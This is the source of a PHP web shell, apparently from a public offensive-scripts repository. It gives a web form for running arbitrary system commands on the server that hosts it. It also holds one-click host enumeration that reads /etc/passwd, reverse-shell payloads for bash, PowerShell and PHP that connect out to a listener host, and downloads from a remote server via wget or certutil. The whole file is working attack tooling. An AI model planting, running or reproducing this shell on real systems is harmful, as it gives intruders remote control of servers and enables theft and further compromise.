<!DOCTYPE html>
<html>
<!-- Simple host exploration script: basic host enumeration using PHP -->
<!-- https://github.com/isabellecda/cyber-scripts -->
<form  method="POST">
	<!-- Defines PHP function to sent the commands. Verifies disabled_functions. -->
	<?php
		// Check OS - Only Linux and Windows supported.
		$os = php_uname('s');
	
		if("$os" != "Linux" and "$os" != "Windows") {
			echo 'OS not supported.';
			exit();
		}
	
		echo "OS: $os --- ";
	
		// Check disabled functions
		function is_available($func) {  
			$available = true;
			if (ini_get('safe_mode')) {
			    $available = false;
			} else {
			    $d = ini_get('disable_functions');
			    $s = ini_get('suhosin.executor.func.blacklist');
			    if ("$d$s") {
				$array = preg_split('/,\s*/', "$d,$s");
				if (in_array($func, $array)) {
				    $available = false;
				}
			    }
			}
			    
			return $available;
		}
		
		$disabled = "";
		
		echo "Using PHP function: ";
		if(is_available('system')) {
			echo 'system()';
			$cmdType = 'system';
		} else if(is_available('passthru')) {
			echo 'passthru()';
			$cmdType = 'passthru';
		}  else if(is_available('shell_exec')) {
			echo 'shell_exec()';
			$cmdType = 'shell_exec';
		}   else if(is_available('exec')) {
			echo 'exec()';
			$cmdType = 'exec';
		} else {
			echo "Attention! Functions 'system', 'passthru', 'shell_exec' and 'exec' are disabled. Some buttons won't work.";
			$disabled = "disabled";
		}

	?>
	<br><br>
	Command:        
	<!-- Commands sent using POST method-->
	<input type="text" name="mycmd" <?php echo $disabled?>>
        <input type="submit" name="btnPost" value="POST" <?php echo $disabled?>>
	<!-- Basic enum commands -->
	<input type="submit" name="btnEnum" value="Simple Enum" <?php echo $disabled?>>
	<!-- Executes PHP info -->
	<input type="submit" name="btnPhpInfo" value="phpinfo">
	<br><br>
	Reverse:
	<!-- Will try to get a reverse shell --> 
	<!-- Handler must be listening at the defined host and port -->
	<input type="text" name="lhost" value="192.168.80.10" size="10" <?php echo $disabled?>>
	<input type="text" name="lport" value="1234" size="5" <?php echo $disabled?>>
	<input type="submit" name="btnBash" value="Reverse Default" <?php echo $disabled?>>
	<input type="submit" name="btnPhp" value="Reverse PHP">
	<br><br>
	HTTP Server:
	<!-- HTTP server must be available at the defined host and port -->
	<!-- File will be downloaded from the HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
	<input type="text" name="fileHost" value="192.168.80.10" size="10">
	<input type="text" name="filePort" value="1235" size="5">
	<input type="text" name="fileName" value="">
	<input type="submit" name="btnWget" value="Sys Download" <?php echo $disabled?>>
	<input type="submit" name="btnPhpDownload" value="PHP Download">
	<br><br>
	
	</form>
</html>
<?php
	// Executes a system command and exit
	function exec_cmd_and_exit($type, $cmd) {
		echo "# $cmd";
	        echo '<br><br>';
	
		switch($type) {
			case 'passthru':
				passthru("$cmd 2>&1", $return_value);
			  	($return_value == 0) or die();
				break;
			case 'shell_exec':
				echo (shell_exec("$cmd 2>&1"));
				break;
			case 'exec':
				exec("$cmd 2>&1", $array);
				foreach ($array as &$value) {
		    			echo ($value);;
				}
				break;
			default:
				system("$cmd 2>&1", $return_value);
		  		($return_value == 0) or die();			
		}
		exit();
	}

	echo '<br><hr><br>';

	// Calls phpinfo()
	if (isset($_REQUEST['btnPhpInfo'])) 
	{
		phpinfo();		
		exit();
	}

	// Command parameters
	$lhost = $_REQUEST['lhost'];
	$lport = $_REQUEST['lport'];

	$fileHost = $_REQUEST['fileHost'];
	$filePort = $_REQUEST['filePort'];
	$fileName = $_REQUEST['fileName'];

	// Verifies command buttons
	if (isset($_REQUEST['btnEnum'])) {
		$cmd = "$os" == Linux ? 
			"whoami; id; pwd; ip a; cat /etc/passwd" : 
			"whoami; hostname; ver; systeminfo";
		
		exec_cmd_and_exit($cmdType, $cmd);
	}

	// Reverse Default
	if (isset($_REQUEST['btnBash'])) {
	
		$winSocketShell = 'powershell.exe;$client = New-Object System.Net.Sockets.' . "TCPClient($lhost,$lport)" . ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ;
	
		$cmd = "$os" == "Linux" ? 
			"/bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'" : 
			'$winSocketShell';  // TODO: Check
		
		exec_cmd_and_exit($cmdType, $cmd);
	} 

	if (isset($_REQUEST['btnPhp'])) {
        	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
		exec_cmd_and_exit($cmdType, $cmd);
	} 
	
	// Process file download
	$fileFrom = "http://$fileHost:$filePort/$fileName";
	
	$fileTo = "$os" == "Linux" ? 
			"/tmp/$fileName" :
			"C:/Users/Public/Downloads/$fileName";

	if (isset($_REQUEST['btnWget'])) {
        	$cmd = "$os" == "Linux" ? 
			"wget $fileFrom -O $fileTo" : 
			"certutil -urlcache -split -f $fileFrom $fileTo"; // TODO: Check
        	
		exec_cmd_and_exit($cmdType, $cmd);
    	}

	if (isset($_REQUEST['btnPhpDownload'])) {
		echo "# file_put_contents($fileTo, file_get_contents($fileFrom))";
		echo '<br><br>';
        	if (file_put_contents($fileTo, file_get_contents($fileFrom))) {
			echo 'File downloaded successfully!';
		} else {
			echo 'File downloading failed.';
		}
		exit();
    	}

	// Default cmd exec
	$cmd = $_REQUEST['mycmd'];
	exec_cmd_and_exit($cmdType, $cmd);

?>
